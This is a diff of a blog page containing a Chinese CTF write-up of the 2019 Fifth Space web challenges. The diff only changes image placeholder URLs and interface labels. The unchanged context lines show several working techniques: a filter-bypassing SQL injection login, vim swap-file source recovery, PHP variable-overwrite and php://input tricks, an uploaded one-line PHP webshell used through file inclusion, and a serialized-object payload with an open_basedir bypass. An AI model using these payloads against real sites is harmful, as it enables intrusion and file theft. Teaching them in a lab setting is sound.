@@ -120,12 +120,12 @@
         <div class="post-content mx-auto">
           <div class="markdown-body">
             <h1><span id="空相">空相</span></h1><p>（1）进入页面，提示了参数id </p>
-<p><img src="/2019/09/01/第五空间Writeup-Web/20190903160325343.png" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"></p>
-<p>（2）尝试一下：?id=1‘<br><img src="/2019/09/01/第五空间Writeup-Web/20190903160348218.png" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"></p>
-<p>（3）访问该文件，并加上队伍的token作为参数即可，<br><img src="/2019/09/01/第五空间Writeup-Web/2019090316072259.png" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"></p>
+<p><img src="/2019/09/01/第五空间Writeup-Web/20190903160325343.png" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"></p>
+<p>（2）尝试一下：?id=1‘<br><img src="/2019/09/01/第五空间Writeup-Web/20190903160348218.png" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"></p>
+<p>（3）访问该文件，并加上队伍的token作为参数即可，<br><img src="/2019/09/01/第五空间Writeup-Web/2019090316072259.png" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"></p>
 <p><br></p>
 <h1><span id="五叶">五叶</span></h1><p>（1）进入后，是一个登陆界面</p>
-<p><img src="/2019/09/01/第五空间Writeup-Web/20190903160801767.png" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"><br>（2）这一题比较脑洞，实际上是用万能密码来进行登陆admin账号。</p>
+<p><img src="/2019/09/01/第五空间Writeup-Web/20190903160801767.png" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"><br>（2）这一题比较脑洞，实际上是用万能密码来进行登陆admin账号。</p>
 <ul>
 <li><p>经过测试：过滤了*、=、and、or、from、select、union、insert、update等，单引号加括号闭合。</p>
 </li>
@@ -136,21 +136,21 @@
 <li><p>拼接后为： <code>….  where password =(‘1’) || username=&#39;admin&#39; --</code></p>
 </li>
 </ul>
-<p><img src="/2019/09/01/第五空间Writeup-Web/2019090316091050.png" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"></p>
+<p><img src="/2019/09/01/第五空间Writeup-Web/2019090316091050.png" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"></p>
 <p><br></p>
 <h1><span id="六尘非预期">六尘（非预期）</span></h1><p>（1）扫目录得到/log/</p>
-<p><img src="/2019/09/01/第五空间Writeup-Web/20190903160951628.png" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"></p>
+<p><img src="/2019/09/01/第五空间Writeup-Web/20190903160951628.png" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"></p>
 <p>（2）访问如下，可以直接看到access.log的内容：</p>
-<p><img src="/2019/09/01/第五空间Writeup-Web/20190903161003750.png" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"></p>
+<p><img src="/2019/09/01/第五空间Writeup-Web/20190903161003750.png" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"></p>
 <p>（3）在access.log日志中搜索关键词flag，发现存在flagishere目录，访问里面的文件，并替换token即可。</p>
-<p><img src="/2019/09/01/第五空间Writeup-Web/20190903161018938.png" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"></p>
+<p><img src="/2019/09/01/第五空间Writeup-Web/20190903161018938.png" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"></p>
 <p><strong>预期解</strong>：通过SSRF扫描端口 + gopher协议攻击内网的Struts2，题目环境开的时间太短了，没来得及复现..</p>
 <p><br></p>
-<h1><span id="空性">空性</span></h1><p>（1）进入后，是一个登陆界面，发现这里右键查看不了代码（用了一段JS代码实现的），F12或BP抓包看到如下一段JS代码，用户名和密码均为Youguess，但实际上我们直接访问那个文件即可。<br><img src="/2019/09/01/第五空间Writeup-Web/2019090316112880.png" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"></p>
+<h1><span id="空性">空性</span></h1><p>（1）进入后，是一个登陆界面，发现这里右键查看不了代码（用了一段JS代码实现的），F12或BP抓包看到如下一段JS代码，用户名和密码均为Youguess，但实际上我们直接访问那个文件即可。<br><img src="/2019/09/01/第五空间Writeup-Web/2019090316112880.png" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"></p>
 <p>（2）访问./151912db206ee052.php，页面上除了显示“听说你的Linux用的很6？”这句话以外，得不到任何有用信息，于是考虑文件泄露。</p>
 <p>Linux下的vim编辑器在非正常退出的情况下会自动生成swp后缀的备份文件，由于此类格式文件无法解析，此时便可以通过浏览器直接下载此敏感文件，这导致程序的源码泄漏。</p>
 <p>（3）于是访问 xxx/.151912db206ee052.php.swp下载文件，并通过命令<code>vi –r [文件名]</code>进行恢复。</p>
-<p><img src="/2019/09/01/第五空间Writeup-Web/20190903161215948.png" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"></p>
+<p><img src="/2019/09/01/第五空间Writeup-Web/20190903161215948.png" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"></p>
 <p>（4）审计代码如下：</p>
 <pre><code class="php">&lt;?php  
 error_reporting(0);  
@@ -176,13 +176,13 @@ $execfirst -&gt; firstlevel();
 <ul>
 <li><p>利用方式一：PHP伪协议——php://input，所以构造：<code>?fname=php://input</code>，并POST数据：<code>whoami</code></p>
 </li>
-<li><p>利用方式二：变量覆盖——extract()，注意到<code>$a==$content</code>进行的是松散比较，所以构造payload：<code>?a=&amp; fname=lethe</code><br><img src="/2019/09/01/第五空间Writeup-Web/20190903161506717.png" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"></p>
+<li><p>利用方式二：变量覆盖——extract()，注意到<code>$a==$content</code>进行的是松散比较，所以构造payload：<code>?a=&amp; fname=lethe</code><br><img src="/2019/09/01/第五空间Writeup-Web/20190903161506717.png" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"></p>
 </li>
 </ul>
 <p>（5）上一层成功绕过后，会进入到一个上传界面，通过白名单严格的限制了上传文件的后缀，且对文件内容中的eval()、system()、 phpinfo()等许多函数进行了检测，所以想按一般的文件上传getshell是不行的。</p>
 <p> fuzz+脑洞，发现可以上传html后缀的文件，但是上传html文件有什么用呢，并不能解析其中的php代码。</p>
 <p>看到url中的参数有<code>file=xxxxxx</code>这个参数，很像文件包含的题目形式。</p>
-<p><img src="/2019/09/01/第五空间Writeup-Web/20190903161552691.png" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"></p>
+<p><img src="/2019/09/01/第五空间Writeup-Web/20190903161552691.png" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"></p>
 <p>测试发现<code>http://111.33.164.6:10003/3792689baaabc7eb</code>本身就是一个上传页面，猜测存在文件包含。</p>
 <p>于是构造html文件的内容为：<code>&lt;?php $f = $_GET[f]; $f($_GET[s]); ?&gt;</code>         </p>
 <p>上传后，修改url中file参数的值，<code>?file=upload/xxxxxxxx</code>（上传的文件目录，去掉文件后缀），然后传入相应参数，即可getshell。</p>
@@ -304,7 +304,7 @@ eval()
 <p>同时通过dangerous参数传入命令，注意要用<code>;</code>闭合前面的赋值语句。</p>
 <p>（4）最后在读flag的时候好像还要bypass open_basedir。</p>
 <p>可以参考：<a href="https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/" target="_blank" rel="noopener">从PHP底层看open-basedir-bypass</a></p>
-<p><img src="/2019/09/01/第五空间Writeup-Web/20190903163125433.png" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"></p>
+<p><img src="/2019/09/01/第五空间Writeup-Web/20190903163125433.png" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"></p>
 <p>最终payload：</p>
 <p><code>?foo=O%3A13%3A%22Welcome_again%22%3A2%3A%7Bs%3A7%3A%22willing%22%3Bi%3A1%3Bs%3A6%3A%22action%22%3BO%3A4%3A%22Test%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00careful%22%3Bi%3A0%3Bs%3A8%3A%22securuty%22%3Ba%3A1%3A%7Bs%3A9%3A%22say_hello%22%3Bi%3A1%3B%7D%7D%7D&amp;dangerous=1;chdir(&#39;/tmp&#39;);mkdir(&#39;sky&#39;);chdir(&#39;sky&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);echo(file_get_contents(&#39;/var/www/flag.php&#39;));</code></p>
 
@@ -337,7 +337,7 @@ eval()
     <div class="d-none d-lg-block col-lg-2 toc-container">
       
   <div id="toc">
-    <p class="h4"><i class="far fa-list-alt"></i>&nbsp;目录</p>
+    <p class="h4"><i class="far fa-list-alt"></i>&nbsp;TOC</p>
     <div id="tocbot"></div>
   </div>
 
@@ -391,7 +391,7 @@ eval()
   <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
     <div class="modal-content">
       <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
         <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
           <span aria-hidden="true">&times;</span>
         </button>
@@ -399,7 +399,7 @@ eval()
       <div class="modal-body mx-3">
         <div class="md-form mb-5">
           <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
         </div>
         <div class="list-group" id="local-search-result"></div>
       </div>
